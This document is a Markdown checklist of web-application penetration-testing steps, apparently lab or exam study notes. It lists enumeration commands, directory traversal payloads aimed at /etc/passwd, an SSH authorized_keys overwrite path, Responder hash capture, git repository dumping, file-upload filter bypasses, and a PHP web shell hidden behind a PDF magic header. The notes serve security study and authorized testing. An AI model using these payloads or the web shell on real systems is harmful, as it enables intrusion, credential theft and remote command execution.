# Initial Enumeration

- [ ] Manually enumerate Web Application on your Kali Machine Firefox browser
```
Firefox Debugger tool
Firefox Inspector tool
Firefox Network tool
```

- [ ] Manually check common for directories and files from your Kali Machine
```
/robots.txt
```

- [ ] Fingerprint Web Application with `nmap` on your Kali Machine
```
sudo nmap -O -A --script vuln -p 80 192.168.yyy.yyy
```
```
nmap -p 80 -sV --script http-headers,http-methods,http-server-header,http-title,http-enum,http-git 192.168.yyy.yyy
```

- [ ] Identify web technologies with `whatweb` on your Kali Machine
```
whatweb http://192.168.yyy.yyy
```

- [ ] Check if WordPress is running from your Kali Machine
```
wpscan --url http://example.com/
```

- [ ] Directory Busting with different wordlists from your Kali Machine
```
gobuster dir -u http://192.168.yyy.yyy:80 -w /usr/share/wordlists/dirb/big.txt -t 5
```
```
gobuster dir -u http://192.168.yyy.yyy:80 -w /usr/share/wordlists/dirb/common.txt -t 5
```
```
gobuster dir -u http://192.168.yyy.yyy:80 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 5
```
```
gobuster dir -u http://192.168.yyy.yyy:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 5
```
```
gobuster dir -u http://192.168.yyy.yyy:80 -w /usr/share/wordlists/wfuzz/general/megabeast.txt -t 5
```
```
gobuster dir -u http://192.168.yyy.yyy:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 5
```

- [ ] Bruteforcing API Paths using pattern from your Kali Machine
```
gobuster dir -u http://192.168.yyy.yyy:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -p pattern
```
Gobuster pattern
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

- [ ] Recursively bruteforcing paths from your Kali Machine
```
feroxbuster -u http://192.168.yyy.yyy:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --quiet -o ferox_out.txt
```

- [ ] Identify pages and files from your Kali Machine
```
gobuster dir -u http://192.168.yyy.yyy:80 -w /usr/share/wordlists/dirb/common.txt -x txt,pdf,config
```
```
feroxbuster -u http://192.168.yyy.yyy:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x pdf,js,html,php,txt,ini,config,json,docx,doc,xls,xlsx,xlsm,zip,log,git --quiet -o ferox_out.txt
```

- [ ] Check for Directory Traversal Vulnerabilities from your Kali Machine
```
http://example.com/index.php?page=../../../etc/passwd%00
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://example.com/index.php?page=%5c..%5c..%5c..%5cetc/passwd
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=.%2e/%2e%2e/%2e%2e/etc/passwd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
- Try changing `/` for `\`

- [ ] Check for Inclusion Vulnerabilities from your Kali Machine
```
Log Poisoning
PHP Wrappers
Local File Inclusion (LFI)
Remote File Inclusion (RFI)
```

- [ ] Check for use of Executable Files from your Kali Machine
```
Usage of Webshell
```

- [ ] Check for use of Non-Executable Files from your Kali Machine
```
Overwritting files 
E.g., Overwrite SSH authorized keys ../../../../../root/.ssh/authorized_keys
```

- [ ] Check for Injection from your Kali Machine
```
SQL Injection
MSSQL xp_cmdshell
OS Command Injection aka shell injection
```

- [ ] Check for exploits from your Kali Machine
```
searchsploit Apache
```
- Search the title
- Search the technologies used
	- E.g., Web server version, php version, etc.

# Possible exploits

## Exposed git directory

- [ ] Download git-dumper on your Kali Machine
```
git clone https://github.com/arthaud/git-dumper
cd git-dumper
pip install -r requirements.txt
```

- [ ] Dump git repository from web application on your Kali Machine
```
python git_dumper.py http://192.168.yyy.yyy/.git/ /home/kali/Desktop/test
```

## Rogue authentication server

- [ ] Start `responder` to answer to File Server Service request for SMB on our Kali machine to capture user's Net-NTLMv2 hash
```
sudo responder -I tun0 -v
```

- [ ] Create an SMB connection to our Kali machine
```
\\192.168.xxx.xxx\test
```

- [ ] Crack the hashes on your Kali Machine or use for PtH

## File Upload

### File Extensions

- [ ] Intercept upload request

- [ ] Change the file extension
```
.php
.pHp
```

- [ ] Adding special characters at the end
```
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
```

- [ ] Adding junk data (null bytes) between extensions
```
file.php.png
file.png.php
file.png.jpg.php
file.php#.png
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
```

### Content Type

- [ ] Intercept upload request

- [ ] Change content type
```
Content-Type: application/pdf
```

### File signatures (Magic Bytes)

- [ ] Intercept upload request

- [ ] Change the file signature of the file content E.g., Bypass PDF signature check
```
%PDF-
<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>
```

References:
https://book.hacktricks.xyz/pentesting-web/file-upload
https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/